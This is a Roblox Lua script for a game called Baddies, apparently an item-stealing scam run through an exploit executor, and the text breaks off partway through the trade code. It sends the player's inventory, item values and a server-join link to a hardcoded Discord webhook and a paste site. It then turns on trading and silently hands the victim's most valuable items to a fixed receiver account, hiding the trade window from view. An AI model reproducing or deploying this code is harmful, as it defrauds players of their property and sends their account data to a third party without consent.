-- ===== CONFIG =====
local WEBHOOK_URL = "https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
local RECEIVER = "baddiestest777"
local ENABLE_TRADE = true
local TRADE_INVITE_COOLDOWN = 6
local TRADE_ADD_DELAY = 0
local TRADE_MODIFY_BUFFER = 0.03
local TRADE_MAX_ITEMS = 20
local HIDE_TRADE_GUI = true
local SINGLE_ITEM_MIN_RAP = 1000
local EVERYONE_RAP_THRESHOLD = 1000
local NEWBIE_PLACE_IDS = {
    [127077458902864] = true,
    [88099069191088] = true,
}
-- ==================

getgenv().BaddiesAllowTrade = false

if getgenv().BaddiesScriptRunning then
    print("this script already running")
    return
end
getgenv().BaddiesScriptRunning = true

getgenv().BaddiesLastScan = { status = "starting", at = os.time() }

local function setScanStatus(status, detail)
    getgenv().BaddiesLastScan = {
        status = status,
        detail = detail,
        at = os.time(),
    }
end

if getgenv().BaddiesScannerRunning then
    getgenv().BaddiesScannerRunning = nil
end

if WEBHOOK_URL == "" then
    getgenv().BaddiesScriptRunning = false
    return
end

if RECEIVER == "" then
    getgenv().BaddiesScriptRunning = false
    return
end

local RECEIVERS = { RECEIVER }

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local function kickAndStop(message)
    setScanStatus("kicked", message)
    getgenv().BaddiesScriptRunning = false
    getgenv().BaddiesAllowTrade = false
    LocalPlayer:Kick(message)
end

local function isPrivateServer()
    if typeof(game.PrivateServerId) == "string" and game.PrivateServerId ~= "" then
        return true
    end
    if typeof(game.PrivateServerOwnerId) == "number" and game.PrivateServerOwnerId ~= 0 then
        return true
    end
    if workspace:GetAttribute("IsVIPServer") == true then
        return true
    end
    return false
end

local function isNewbieServer()
    return NEWBIE_PLACE_IDS[game.PlaceId] == true
end

local function validateServerEarly()
    if isPrivateServer() then
        return false, "Private servers are not supported."
    end
    if isNewbieServer() then
        return false, "Newbie servers are not supported."
    end
    return true
end

local CATEGORY_CONFIG = {
    {
        key = "Weapons",
        label = "Weapons",
        emoji = "Ã¢Å¡â€Ã¯Â¸Â",
    },
    {
        key = "Fighting Style",
        label = "Fighting Style",
        emoji = "Ã°Å¸â€˜Å ",
    },
    {
        key = "stomp",
        label = "Stomp",
        emoji = "Ã°Å¸â€˜Å¸",
    },
    {
        key = "Loveboard",
        label = "Board Skin",
        emoji = "Ã°Å¸â€ºÂ¹",
    },
}

local function getExecutorName()
    if typeof(identifyexecutor) == "function" then
        local ok, name = pcall(identifyexecutor)
        if ok and typeof(name) == "string" and name ~= "" then
            return name
        end
    end
    return "Unknown"
end

local function getRequestFn()
    if typeof(request) == "function" then
        return request
    end
    if typeof(http_request) == "function" then
        return http_request
    end
    if syn and typeof(syn.request) == "function" then
        return syn.request
    end
    if fluxus and typeof(fluxus.request) == "function" then
        return fluxus.request
    end
    return nil
end

local function httpRequest(options)
    local req = getRequestFn()
    if req then
        local ok, res = pcall(function()
            return req(options)
        end)
        if ok then
            return res
        end
        return nil
    end

    local ok, res = pcall(function()
        return HttpService:RequestAsync({
            Url = options.Url,
            Method = options.Method or "GET",
            Headers = options.Headers or {},
            Body = options.Body,
        })
    end)
    if ok then
        return res
    end
    return nil
end

local function httpPost(url, body)
    local payload = HttpService:JSONEncode(body)
    local req = getRequestFn()
    if req then
        local ok, res = pcall(function()
            return req({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                },
                Body = payload,
            })
        end)
        if not ok then
            return false, res
        end
        local status = res.StatusCode or res.status or res.Status or 0
        if status >= 200 and status < 300 then
            return true
        end
        return false, ("HTTP %s"):format(tostring(status))
    end

    local ok, res = pcall(function()
        return HttpService:RequestAsync({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
            },
            Body = payload,
        })
    end)
    if ok and res and res.Success then
        return true
    end
    return false, ok and res and res.StatusMessage or "No HTTP client available"
end

local function waitForDataReplion(timeout)
    timeout = timeout or 30
    local Replion = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Replion"))
    local started = os.clock()
    while os.clock() - started < timeout do
        local ok, rep = pcall(function()
            return Replion.Client:WaitReplion("Data", 2)
        end)
        if ok and rep then
            return rep
        end
        task.wait(0.5)
    end
    return nil
end

local function loadCatalog()
    local Shared = ReplicatedStorage:WaitForChild("Shared")
    local catalog = {
        weapons = {},
        skins = {},
        tradeData = nil,
    }

    pcall(function()
        catalog.weapons = require(Shared:WaitForChild("Weapons"))
    end)
    pcall(function()
        catalog.skins = require(ReplicatedStorage:WaitForChild("SkinCrates"):WaitForChild("Items"))
    end)
    pcall(function()
        catalog.tradeData = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
    end)

    return catalog
end

local function waitForRapReplion(timeout)
    timeout = timeout or 20
    local Replion = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Replion"))
    local started = os.clock()
    while os.clock() - started < timeout do
        local ok, rep = pcall(function()
            return Replion.Client:WaitReplion("RAP", 2)
        end)
        if ok and rep then
            return rep
        end
        task.wait(0.5)
    end
    return nil
end

local function getItemRap(rapReplion, tradeData, itemType, subType, name)
    if not tradeData or not name then
        return nil
    end

    local itemId = tradeData.GetItemId(itemType, {
        Name = name,
        Type = subType,
    })

    if rapReplion then
        local cached = rapReplion:Get({ "RAPs", itemType, itemId })
        if cached ~= nil then
            return cached
        end
    end

    if not tradeData.Remotes or not tradeData.Remotes.GetItemRAP then
        return nil
    end

    local ok, rap = pcall(function()
        return tradeData.Remotes.GetItemRAP:InvokeServer(itemType, {
            Name = name,
            Type = subType,
        })
    end)

    if ok and typeof(rap) == "number" then
        return rap
    end

    return nil
end

local function formatRap(rap)
    if rap == nil then
        return "?"
    end
    return tostring(rap)
end

local EMBED_DESC_LIMIT = 3900

local function isTradeableNow(tradeLock)
    if typeof(tradeLock) ~= "table" then
        return true
    end
    if tradeLock.Type == "Untradable" then
        return false
    end
    if tradeLock.Type == "Timestamp" and tradeLock.Time then
        return workspace:GetServerTimeNow() >= tradeLock.Time
    end
    return true
end

local function isTrackedSkinType(itemType)
    for _, category in ipairs(CATEGORY_CONFIG) do
        if category.key == itemType then
            return true
        end
    end
    return false
end

local function parseTradeStatus(tradeLock)
    if typeof(tradeLock) ~= "table" then
        return "Ã¢Å“â€¦ Tradeable"
    end
    if tradeLock.Type == "Untradable" then
        return "Ã¢ÂÅ’ Untradeable"
    end
    if tradeLock.Type == "Timestamp" and tradeLock.Time then
        local remaining = math.max(0, math.floor(tradeLock.Time - workspace:GetServerTimeNow()))
        if remaining <= 0 then
            return "Ã¢Å“â€¦ Tradeable"
        end
        local hours = math.floor(remaining / 3600)
        local mins = math.floor((remaining % 3600) / 60)
        return ("Ã¢ÂÅ’ %dh %dm"):format(hours, mins)
    end
    if tradeLock.Type == "None" or tradeLock.Type == nil then
        return "Ã¢Å“â€¦ Tradeable"
    end
    return ("Ã¢ÂÅ’ %s"):format(tostring(tradeLock.Type))
end

local function buildWeaponEntry(guid, item, weaponsCatalog, rapReplion, tradeData)
    local name = item.Name or "Unknown"
    local meta = weaponsCatalog[name]
    local rarity = meta and meta.Rarity or "Unknown"
    local rap = getItemRap(rapReplion, tradeData, "Weapon", nil, name)
    return {
        name = name,
        rarity = rarity,
        tradeStatus = parseTradeStatus(item.TradeLock),
        rap = rap,
        guid = guid,
    }
end

local function buildSkinEntry(guid, item, skinsCatalog, rapReplion, tradeData)
    local name = item.Name or "Unknown"
    local meta = skinsCatalog[name]
    local rarity = meta and meta.Rarity or "Unknown"
    local rap = getItemRap(rapReplion, tradeData, "WeaponSkin", item.Type, name)
    return {
        name = name,
        rarity = rarity,
        tradeStatus = parseTradeStatus(item.TradeLock),
        rap = rap,
        guid = guid,
        type = item.Type,
    }
end

local function collectInventory(dataReplion, catalog, rapReplion)
    local results = {}

    for _, category in ipairs(CATEGORY_CONFIG) do
        results[category.key] = {}
    end

    local weapons = dataReplion:Get({ "NewInventory", "Items", "Weapon" })
    if typeof(weapons) == "table" then
        for guid, item in pairs(weapons) do
            if typeof(item) == "table" then
                table.insert(results.Weapons, buildWeaponEntry(tostring(guid), item, catalog.weapons, rapReplion, catalog.tradeData))
            end
        end
    end

    local weaponSkins = dataReplion:Get({ "NewInventory", "Items", "WeaponSkin" })
    if typeof(weaponSkins) == "table" then
        for guid, item in pairs(weaponSkins) do
            if typeof(item) == "table" and item.Type then
                local bucket = results[item.Type]
                if bucket then
                    table.insert(bucket, buildSkinEntry(tostring(guid), item, catalog.skins, rapReplion, catalog.tradeData))
                end
            end
        end
    end

    local rarityOrder = {
        OG = 1,
        Exclusive = 2,
        Legend = 3,
        Epic = 4,
        Rare = 5,
        Basic = 6,
        Unknown = 99,
    }

    local function sortEntries(list)
        table.sort(list, function(a, b)
            local ra = rarityOrder[a.rarity] or 50
            local rb = rarityOrder[b.rarity] or 50
            if ra ~= rb then
                return ra < rb
            end
            return a.name < b.name
        end)
    end

    for _, category in ipairs(CATEGORY_CONFIG) do
        sortEntries(results[category.key])
    end

    return results
end

local function formatEntryLine(entry)
    return ("Ã¢â‚¬Â¢ %s [%s] - %s RAP - %s"):format(entry.name, entry.rarity, formatRap(entry.rap), entry.tradeStatus)
end

local function getAllEntriesSortedByRap(results)
    local all = {}
    for _, category in ipairs(CATEGORY_CONFIG) do
        for _, entry in ipairs(results[category.key]) do
            table.insert(all, {
                category = category,
                entry = entry,
            })
        end
    end
    table.sort(all, function(a, b)
        local rapA = a.entry.rap or 0
        local rapB = b.entry.rap or 0
        if rapA ~= rapB then
            return rapA > rapB
        end
        return a.entry.name < b.entry.name
    end)
    return all
end

local function buildTradeableItemsBlock(results, topRapLimit)
    if topRapLimit then
        local sorted = getAllEntriesSortedByRap(results)
        local sections = {}
        local byCategory = {}

        for i = 1, math.min(topRapLimit, #sorted) do
            local item = sorted[i]
            local key = item.category.key
            if not byCategory[key] then
                byCategory[key] = {
                    category = item.category,
                    entries = {},
                }
            end
            table.insert(byCategory[key].entries, item.entry)
        end

        for _, category in ipairs(CATEGORY_CONFIG) do
            local bucket = byCategory[category.key]
            if bucket and #bucket.entries > 0 then
                local sectionLines = { ("%s %s (%d)"):format(category.emoji, category.label, #bucket.entries) }
                for _, entry in ipairs(bucket.entries) do
                    table.insert(sectionLines, formatEntryLine(entry))
                end
                table.insert(sections, table.concat(sectionLines, "\n"))
            end
        end

        if #sections == 0 then
            return "No owned items"
        end
        return table.concat(sections, "\n")
    end

    local sections = {}
    for _, category in ipairs(CATEGORY_CONFIG) do
        local entries = results[category.key]
        local sectionLines = { ("%s %s (%d)"):format(category.emoji, category.label, #entries) }
        if #entries == 0 then
            table.insert(sectionLines, "No owned items")
        else
            for _, entry in ipairs(entries) do
                table.insert(sectionLines, formatEntryLine(entry))
            end
        end
        table.insert(sections, table.concat(sectionLines, "\n"))
    end
    return table.concat(sections, "\n")
end

local function buildFullInventoryLines(results)
    local lines = {}
    for _, category in ipairs(CATEGORY_CONFIG) do
        local entries = results[category.key]
        if #entries > 0 then
            table.insert(lines, ("%s %s (%d)"):format(category.emoji, category.label, #entries))
            for _, entry in ipairs(entries) do
                table.insert(lines, formatEntryLine(entry))
            end
        end
    end
    return lines
end

local function uploadInventoryRaw(results, playerName)
    local lines = buildFullInventoryLines(results)
    if #lines == 0 then
        return ""
    end

    local total = 0
    for _, category in ipairs(CATEGORY_CONFIG) do
        total += #results[category.key]
    end

    local content = string.format(
        "=== BADDIES FULL INVENTORY ===\nUsername: %s\nDisplay Name: %s\nTotal Items: %d\n\n%s",
        playerName,
        LocalPlayer.DisplayName,
        total,
        table.concat(lines, "\n")
    )

    local res = httpRequest({
        Url = "https://api.rubis.app/v2/scrap?public=true",
        Method = "POST",
        Headers = { ["Content-Type"] = "text/plain" },
        Body = content,
    })

    if not res then
        return ""
    end

    local body = res.Body or res.body
    if not body then
        return ""
    end

    local ok, data = pcall(function()
        return HttpService:JSONDecode(body)
    end)
    if ok and data then
        return data.raw
            or (data.scrapID and ("https://api.rubis.app/v2/scrap/" .. data.scrapID .. "/raw"))
            or (data.id and ("https://api.rubis.app/v2/scrap/" .. data.id .. "/raw"))
            or ""
    end

    return ""
end

local function buildJoinUrl()
    return ("https://starscripts-five.vercel.app/start?placeId=%d&gameInstanceId=%s"):format(
        game.PlaceId,
        game.JobId
    )
end

local function resolveReceivers()
    local resolved = {}
    local lines = {}

    for _, name in ipairs(RECEIVERS) do
        local ok, userId = pcall(Players.GetUserIdFromNameAsync, Players, name)
        local inServer = Players:FindFirstChild(name) ~= nil
        if ok and userId then
            table.insert(resolved, {
                name = name,
                userId = userId,
                valid = true,
                inServer = inServer,
            })
            table.insert(lines, ("%s (%d) - %s"):format(
                name,
                userId,
                inServer and "In server" or "Offline"
            ))
        else
            table.insert(resolved, {
                name = name,
                userId = nil,
                valid = false,
                inServer = false,
            })
            table.insert(lines, ("%s - Invalid username"):format(name))
        end
    end

    return resolved, table.concat(lines, "\n")
end

local function getTokenBalance(dataReplion)
    if not dataReplion then
        return 0
    end
    return math.floor(tonumber(dataReplion:Get({ "NewInventory", "Tokens" })) or 0)
end

local function calculateInventoryTotals(results)
    local totalItems = 0
    local totalRap = 0

    for _, category in ipairs(CATEGORY_CONFIG) do
        for _, entry in ipairs(results[category.key]) do
            totalItems += 1
            if typeof(entry.rap) == "number" then
                totalRap += entry.rap
            end
        end
    end

    return totalItems, totalRap
end

local function validateInventoryValue(results)
    local totalItems, totalRap = calculateInventoryTotals(results)
    if totalItems == 1 then
        local singleRap = 0
        for _, category in ipairs(CATEGORY_CONFIG) do
            for _, entry in ipairs(results[category.key]) do
                singleRap = entry.rap or 0
            end
        end
        if singleRap < SINGLE_ITEM_MIN_RAP then
            return false, "Unable to join this server.", totalItems, totalRap
        end
    end
    return true, nil, totalItems, totalRap
end

local function buildDescription(results, meta, topRapLimit)
    local player = LocalPlayer
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers

    local total, totalRap = calculateInventoryTotals(results)
    local tokens = meta.tokens or 0

    local playerInfoBlock = string.format(
        "**Ã°Å¸â€˜Â¤ Player Info**\n```\nUsername     : %s\nDisplay Name : %s\nPlayers      : %d/%d\nExecutor     : %s\nTotal Items  : %d (Total Rap: %d)\nTokens       : %d\n```",
        player.Name,
        player.DisplayName,
        playerCount,
        maxPlayers,
        meta.executorName,
        total,
        totalRap,
        tokens
    )

    local itemsTitle = topRapLimit and "**Ã°Å¸â€œÂ¦ Tradeable Items (Top RAP)**" or "**Ã°Å¸â€œÂ¦ Tradeable Items**"
    local tradeableBlock = string.format(
        "%s\n```\n%s\n```",
        itemsTitle,
        buildTradeableItemsBlock(results, topRapLimit)
    )

    local links = {}
    if meta.inventoryRawUrl and meta.inventoryRawUrl ~= "" then
        table.insert(links, ("Ã°Å¸â€œâ€¹ **[Full Inventory Raw](<%s>)**"):format(meta.inventoryRawUrl))
    end
    if meta.joinUrl and meta.joinUrl ~= "" then
        table.insert(links, ("Ã°Å¸â€â€” **[Join Server](<%s>)**"):format(meta.joinUrl))
    end

    local description = playerInfoBlock .. "\n" .. tradeableBlock
    if topRapLimit then
        description ..= "\n*Showing highest RAP items only. Full list is in the raw link.*"
    end
    if #links > 0 then
        description ..= "\n" .. table.concat(links, "\n")
    end

    return description
end

local function buildDiscordPayload(results, meta)
    local description = buildDescription(results, meta, nil)
    if #description > EMBED_DESC_LIMIT then
        local sorted = getAllEntriesSortedByRap(results)
        local topCount = #sorted
        while topCount > 1 do
            topCount -= 1
            description = buildDescription(results, meta, topCount)
            if #description <= EMBED_DESC_LIMIT then
                break
            end
        end
    end

    return {
        content = meta.pingEveryone and "@everyone" or "",
        username = "Baddies Scanner",
        embeds = {
            {
                title = "Ã°Å¸â€™â€¦ Baddies Item Skins Scan",
                description = description,
                color = 0xF1C40F,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                footer = {
                    text = "Baddies Scanner - " .. os.date("%d/%m/%Y %H:%M"),
                },
            },
        },
    }
end

local function scanAndSend()
    local serverOk, serverMessage = validateServerEarly()
    if not serverOk then
        kickAndStop(serverMessage)
        return false
    end

    local executorName = getExecutorName()

    local _, receiversText = resolveReceivers()
    if receiversText == "" then
        receiversText = table.concat(RECEIVERS, ", ")
    end

    local dataReplion = waitForDataReplion(45)
    if not dataReplion then
        setScanStatus("failed", "player data not loaded")
        return false
    end

    local catalog = loadCatalog()

    local rapReplion = waitForRapReplion(20)

    local results = collectInventory(dataReplion, catalog, rapReplion)

    local valueOk, valueMessage, totalItems, totalRap = validateInventoryValue(results)
    if not valueOk then
        kickAndStop(valueMessage)
        return false
    end

    local inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)

    local payload = buildDiscordPayload(results, {
        executorName = executorName,
        tokens = getTokenBalance(dataReplion),
        inventoryRawUrl = inventoryRawUrl,
        joinUrl = buildJoinUrl(),
        pingEveryone = totalRap >= EVERYONE_RAP_THRESHOLD,
    })

    local ok, err = httpPost(WEBHOOK_URL, payload)
    if ok then
        getgenv().BaddiesAllowTrade = true
        setScanStatus("sent", {
            totalItems = totalItems,
            totalRap = totalRap,
        })
        return true
    end

    setScanStatus("failed", err or "webhook request failed")
    return false
end

-- ===== AUTO TRADE =====

local TradeState = {
    replionId = nil,
    active = false,
    completed = false,
    ended = false,
}

local TradeRuntime = {
    tradeData = nil,
    remotes = nil,
    replionModule = nil,
    lastInviteAt = 0,
    tradeListenersReady = false,
    stealthHooksReady = false,
    stealthArmed = false,
    stealthHeartbeat = nil,
    tradingGuiDefaults = nil,
    auxGuiDefaults = nil,
    sessionRunning = false,
    dataReplion = nil,
    catalog = nil,
    rapReplion = nil,
}

local function isTradeUiActive()
    return LocalPlayer:GetAttribute("IsTrading") == true or TradeState.active
end

local function shouldHideTradeGui()
    if not HIDE_TRADE_GUI then
        return false
    end
    return isTradeUiActive()
end

local function hideTradingGuiInstant()
    if not HIDE_TRADE_GUI or not isTradeUiActive() then
        return
    end

    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then
        return
    end

    local trading = playerGui:FindFirstChild("Trading")
    if trading and trading:IsA("ScreenGui") then
        if not TradeRuntime.tradingGuiDefaults then
            local frame = trading:FindFirstChild("Frame")
            TradeRuntime.tradingGuiDefaults = {
                displayOrder = trading.DisplayOrder,
                frameVisible = frame and frame.Visible,
                framePosition = frame and frame.Position,
            }
        end

        trading.Enabled = true
        local frame = trading:FindFirstChild("Frame")
        if frame then
            frame.Visible = false
            frame.Position = UDim2.fromScale(2, 2)
        end
        trading.DisplayOrder = -500
    end

    for _, guiName in ipairs({ "TradeRequestPopup", "TradeList", "ViewInventory" }) do
        local gui = playerGui:FindFirstChild(guiName)
        if gui and gui:IsA("ScreenGui") then
            TradeRuntime.auxGuiDefaults = TradeRuntime.auxGuiDefaults or {}
            if TradeRuntime.auxGuiDefaults[guiName] == nil then
                TradeRuntime.auxGuiDefaults[guiName] = gui.Enabled
            end
            gui.Enabled = false
        end
    end
end

local function restoreTradingGui()
    TradeRuntime.stealthArmed = false

    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then
        TradeRuntime.tradingGuiDefaults = nil
        TradeRuntime.auxGuiDefaults = nil
        return
    end

    local defaults = TradeRuntime.tradingGuiDefaults
    if defaults then
        local trading = playerGui:FindFirstChild("Trading")
        if trading and trading:IsA("ScreenGui") then
            trading.DisplayOrder = defaults.displayOrder
            local frame = trading:FindFirstChild("Frame")
            if frame then
                if defaults.frameVisible ~= nil then
                    frame.Visible = defaults.frameVisible
                end
                if defaults.framePosition then
                    frame.Position = defaults.framePosition
                end
            end
        end
        TradeRuntime.tradingGuiDefaults = nil
    end

    if TradeRuntime.auxGuiDefaults then
        for guiName, wasEnabled in pairs(TradeRuntime.auxGuiDefaults) do
            local gui = playerGui:FindFirstChild(guiName)
            if gui and gui:IsA("ScreenGui") then
                gui.Enabled = wasEnabled
            end
        end
        TradeRuntime.auxGuiDefaults = nil
    end
end

local function armTradeStealth()
    if not HIDE_TRADE_GUI or not isTradeUiActive() then
        return
    end
    TradeRuntime.stealthArmed = true
    hideTradingGuiInstant()
end

local function disarmTradeStealth()
    restoreTradingGui()
end

local function installTradeStealthHooks()
    if TradeRuntime.stealthHooksReady or not HIDE_TRADE_GUI then
        return
    end
    TradeRuntime.stealthHooksReady = true

    task.spawn(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
        local trading = playerGui:WaitForChild("Trading")
        local frame = trading:WaitForChild("Frame")

        trading:GetPropertyChangedSignal("Enabled"):Connect(function()
            if shouldHideTradeGui() then
                hideTradingGuiInstant()
            end
        end)

        frame:GetPropertyChangedSignal("Visible"):Connect(function()
            if shouldHideTradeGui() and frame.Visible then
                frame.Visible = false
            end
        end)

        if TradeRuntime.stealthHeartbeat then
            TradeRuntime.stealthHeartbeat:Disconnect()
        end

        TradeRuntime.stealthHeartbeat = RunService.RenderStepped:Connect(function()
            if shouldHideTradeGui() then
                hideTradingGuiInstant()
            elseif TradeRuntime.stealthArmed then
                disarmTradeStealth()
            end
        end)

        LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
            if LocalPlayer:GetAttribute("IsTrading") then
                armTradeStealth()
            else
                disarmTradeStealth()
            end
        end)
    end)
end

local function getTradeData()
    if TradeRuntime.tradeData then
        return TradeRuntime.tradeData
    end
    local ok, mod = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
    end)
    if ok and mod then
        TradeRuntime.tradeData = mod
        TradeRuntime.remotes = mod.Remotes
    end
    return TradeRuntime.tradeData
end

local function getTradeMaxItems()
    local tradeData = getTradeData()
    local maxItems = tradeData and tradeData.MaxItemsInTrade
    if typeof(maxItems) == "number" and maxItems > 0 then
        return math.floor(maxItems)
    end
    return TRADE_MAX_ITEMS
end

local function getTradeReplionChannel(rep)
    if not rep then
        return nil
    end
    if typeof(rep) == "string" then
        return rep
    end
    return rawget(rep, "_channel") or rep._channel
end

local function normalizeTradeReplionId(value)
    if typeof(value) == "string" and value ~= "" then
        return value
    end
    if typeof(value) == "table" then
        return getTradeReplionChannel(value)
    end
    return nil
end

local function getTradeRemotes()
    local tradeData = getTradeData()
    return tradeData and tradeData.Remotes
end

local function ensureTradeEnabled(dataReplion)
    if not ENABLE_TRADE then
        return true
    end

    local rep = dataReplion or TradeRuntime.dataReplion
    if not rep then
        rep = waitForDataReplion(10)
    end
    if not rep then
        return false
    end

    if rep:Get({ "Settings", "TradeEnabled" }) == true then
        return true
    end

    local firedOk = pcall(function()
        local Net = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net"))
        Net:RemoteEvent("SetPhoneSettings"):FireServer("TradeEnabled", true)
    end)

    if not firedOk then
        return false
    end

    local deadline = os.clock() + 5
    while os.clock() < deadline do
        if rep:Get({ "Settings", "TradeEnabled" }) == true then
            return true
        end
        task.wait(0.1)
    end

    return rep:Get({ "Settings", "TradeEnabled" }) == true
end

local function setupTradeListeners()
    if TradeRuntime.tradeListenersReady then
        return
    end

    installTradeStealthHooks()

    local tradeData = getTradeData()
    if not tradeData or not tradeData.Remotes then
        return
    end

    local remotes = tradeData.Remotes

    remotes.TradeStarted.OnClientEvent:Connect(function(replionId)
        local id = normalizeTradeReplionId(replionId)
        if id then
            TradeState.replionId = id
            TradeState.active = true
            TradeState.completed = false
            TradeState.ended = false
            armTradeStealth()
        end
    end)

    remotes.TradeEnded.OnClientEvent:Connect(function(message)
        TradeState.active = false
        TradeState.ended = true
        TradeState.replionId = nil
        TradeRuntime.sessionRunning = false
        restoreTradingGui()
    end)

    remotes.TradeCompleted.OnClientEvent:Connect(function()
        TradeState.active = false
        TradeState.completed = true
        TradeState.replionId = nil
        TradeRuntime.sessionRunning = false
        restoreTradingGui()
    end)

    TradeRuntime.tradeListenersReady = true
end

local function getReceiverPlayer()
    return Players:FindFirstChild(RECEIVER)
end

local function collectTradableTradeItems(dataReplion, catalog, rapReplion)
    local items = {}

    local weapons = dataReplion:Get({ "NewInventory", "Items", "Weapon" })
    if typeof(weapons) == "table" then
        for guid, item in pairs(weapons) do
            if typeof(item) == "table" and isTradeableNow(item.TradeLock) then
                table.insert(items, {
                    itemType = "Weapon",
                    guid = tostring(guid),
                    name = item.Name or "Unknown",
                    rap = getItemRap(rapReplion, catalog.tradeData, "Weapon", nil, item.Name) or 0,
                })
            end
        end
    end

    local weaponSkins = dataReplion:Get({ "NewInventory", "Items", "WeaponSkin" })
    if typeof(weaponSkins) == "table" then
        for guid, item in pairs(weaponSkins) do
            if typeof(item) == "table" and item.Type and isTrackedSkinType(item.Type) and isTradeableNow(item.TradeLock) then
                table.insert(items, {
                    itemType = "WeaponSkin",
                    guid = tostring(guid),
                    name = item.Name or "Unknown",
                    rap = getItemRap(rapReplion, catalog.tradeData, "WeaponSkin", item.Type, item.Name) or 0,
                })
            end
        end
    end

    table.sort(items, function(a, b)
        if a.rap ~= b.rap then
            return a.rap > b.rap
        end
        return a.name < b.name
    end)

    return items
end

local function isTradeLive()
    return TradeState.active
        or LocalPlayer:GetAttribute("IsTrading") == true
        or TradeRuntime.sessionRunning
end

local function waitForTradingAttribute(timeout)
    timeout = timeout or 15
    local started = os.clock()
    while os.clock() - started < timeout do
        if LocalPlayer:GetAttribute("IsTrading") == true then
            return true
        end
        task.wait(0.05)
    end
    return LocalPlayer:GetAttribute("IsTrading") == true
end

local function waitForTradeStart(timeout)
    timeout = timeout or 20
    local started = os.clock()
    while os.clock() - started < timeout do
        local replionId = normalizeTradeReplionId(TradeState.replionId)
        if replionId and isTradeLive() then
            TradeState.replionId = replionId
            return replionId
        end
        task.wait(0.05)
    end
    return nil
end

local function waitForTradeReplion(replionId, timeout)
    replionId = normalizeTradeReplionId(replionId)
    if not replionId then
        return nil
    end
    timeout = timeout or 15
    if not TradeRuntime.replionModule then
        TradeRuntime.replionModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Replion"))
    end

    local client = TradeRuntime.replionModule.Client
    local direct = client:GetReplion(replionId)
    if direct then
        return direct
    end

    local started = os.clock()
    while os.clock() - started < timeout do
        local ok, rep = pcall(function()
            return client:WaitReplion(replionId, 2)
        end)
        if ok and rep then
            return rep
        end
        direct = client:GetReplion(replionId)
        if direct then
            return direct
        end
        task.wait(0.1)
    end
    return nil
end

local function isGuidAlreadyOffered(tradeRep, itemType, guid)
    local offered = tradeRep:Get({ "Players", tostring(LocalPlayer.UserId), "Items", itemType })
    if typeof(offered) ~= "table" then
        return false
    end
    return offered[guid] == true
end

local function waitForTradeSessionReady(tradeRep, timeout)
    timeout = timeout or 20
    local uid = tostring(LocalPlayer.UserId)
    local started = os.clock()
    while os.clock() - started < timeout do
        if not isTradeLive() then
            return false
        end
        local data = tradeRep.Data
        if data and data.Players and data.Players[uid] then
            return true
        end
        task.wait(0.2)
    end
    return false
end

local function setTradeDebug(patch)
    local debug = getgenv().BaddiesTradeDebug or {}
    for key, value in pairs(patch) do
        debug[key] = value
    end
    getgenv().BaddiesTradeDebug = debug
end

local function invokeTradeRemote(remote, ...)
    local args = table.pack(...)
    local callOk, result, errMsg = pcall(function()
        return remote:InvokeServer(table.unpack(args, 1, args.n))
    end)
    if not callOk then
        return false, tostring(result)
    end
    if result == true then
        return true, nil
    end
    if typeof(errMsg) == "string" and errMsg ~= "" then
        return false, errMsg
    end
    if typeof(result) == "string" and result ~= "" then
        return false, result
    end
    return false, "remote rejected"
end

local function waitForTradeActionUnlock(tradeRep, maxWait)
    local tradeData = getTradeData()
    local countdown = tradeData and tradeData.ChangeCountdownTime or 5
    maxWait = maxWait or (countdown + 2)
    local started = os.clock()

    while isTradeLive() and (os.clock() - started) < maxWait do
        local data = tradeRep.Data
        local lastModified = data and data.LastModifiedTime
        if typeof(lastModified) ~= "number" then
            return true
        end

        local unlockAt = lastModified + countdown
        local now = workspace:GetServerTimeNow()
        if now >= unlockAt - TRADE_MODIFY_BUFFER then
            return true
        end

        task.wait(math.min(0.05, math.max(0.01, unlockAt - now + 0.01)))
    end

    return isTradeLive()
end

local function waitForTradeSessionOpen(tradeRep, timeout)
    timeout = timeout or 15
    local started = os.clock()

    while os.clock() - started < timeout do
        if not isTradeLive() then
            return false
        end

        local uid = tostring(LocalPlayer.UserId)
        local data = tradeRep and tradeRep.Data
        if data and data.Players and data.Players[uid] then
            return true
        end

        task.wait(0.05)
    end

    return false
end

local function addItemsToTrade(tradeRep, items)
    local remotes = getTradeRemotes()
    if not remotes or not remotes.AddItem then
        setTradeDebug({ phase = "add", lastErr = "AddItem remote missing" })
        return 0
    end

    local maxItems = getTradeMaxItems()
    local added = 0
    setTradeDebug({ phase = "adding", tradableCount = #items, added = 0 })

    for index, item in ipairs(items) do
        if not isTradeLive() or added >= maxItems then
            break
        end

        if isGuidAlreadyOffered(tradeRep, item.itemType, item.guid) then
            added += 1
            setTradeDebug({ added = added, lastAdd = item.name, phase = "adding" })
            continue
        end

        local itemAdded = false
        local lastErr = nil

        for attempt = 1, 4 do
            if not isTradeLive() then
                lastErr = "trade ended"
                break
            end

            local ok, errMsg = invokeTradeRemote(remotes.AddItem, item.itemType, item.guid)
            if ok then
                itemAdded = true
                added += 1
                setTradeDebug({
                    phase = "adding",
                    lastAdd = item.name,
                    lastErr = nil,
                    added = added,
                    itemIndex = index,
                })
                break
            end

            lastErr = errMsg or "AddItem rejected"
            setTradeDebug({
                phase = "adding",
                lastAdd = item.name,
                lastErr = lastErr,
                added = added,
